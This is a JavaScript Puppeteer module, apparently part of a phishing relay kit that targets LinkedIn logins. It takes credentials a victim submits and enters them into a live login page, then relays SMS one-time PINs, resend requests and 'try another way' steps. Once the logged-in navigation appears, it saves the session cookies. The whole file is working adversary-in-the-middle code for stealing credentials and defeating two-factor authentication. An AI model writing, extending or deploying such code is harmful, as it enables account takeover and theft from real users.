const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                let username = `[name="session_key"]`
                await page.waitForSelector(username)
                await page.evaluate(() => {
                    document.querySelector(`[name="session_key"]`).value = ""
                    document.querySelector(`[name="session_key"]`).setAttribute("value", "")
                })
                await page.type(username, this.email)
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = [
            ["Home", "My Network", "Jobs", "Messaging", "Notifications", 'Me']
        ]

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-login") {
                let username = `[name="session_key"]`
                let password = `[name="session_password"]`

                await page.waitForSelector(username)
                await page.waitForSelector(password)
                await page.evaluate(() => {
                    document.querySelector(`[name="session_key"]`).value = ""
                    document.querySelector(`[name="session_key"]`).setAttribute("value", "")
                    document.querySelector(`[name="session_password"]`).setAttribute("value", "")
                    document.querySelector(`[name="session_password"]`).value = ""
                })

                await page.type(username, body.session_key)
                await page.type(password, body.session_password)

                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "fetch"
                        || response.request().resourceType() == 'xhr') {
                        await new Promise(re => setTimeout(re, 2000))
                        return true
                    }
                })
            } else if (spikeType == "otp-code") {
                let otpInput = "#input__phone_verification_pin"
                let otpBtn = "#two-step-submit-button"

                await page.waitForSelector(otpInput)
                await page.waitForSelector(otpBtn)
                await page.type(otpInput, body.pin)

                await page.click(otpBtn)
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "fetch"
                        || response.request().resourceType() == 'xhr') {
                        await new Promise(re => setTimeout(re, 2000))
                        return true
                    }
                })
            } else if (spikeType == "resend-code") {
                let btn = "#btn-resend-pin-sms"
                await page.waitForSelector(btn)
                await page.click(btn)
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "fetch"
                        || response.request().resourceType() == 'xhr') {
                        await new Promise(re => setTimeout(re, 2000))
                        return true
                    }
                })
            } else if (spikeType == "resend-request") {
                const sel = "#reset-password-submit-button"
                await page.waitForSelector(sel)
                await page.click(sel)
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "fetch"
                        || response.request().resourceType() == 'xhr') {
                        await new Promise(re => setTimeout(re, 2000))
                        return true
                    }
                })
            } else if (spikeType == "try-another-way") {
                const sel = "#try-another-way"
                await page.waitForSelector(sel)
                await page.click(sel)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }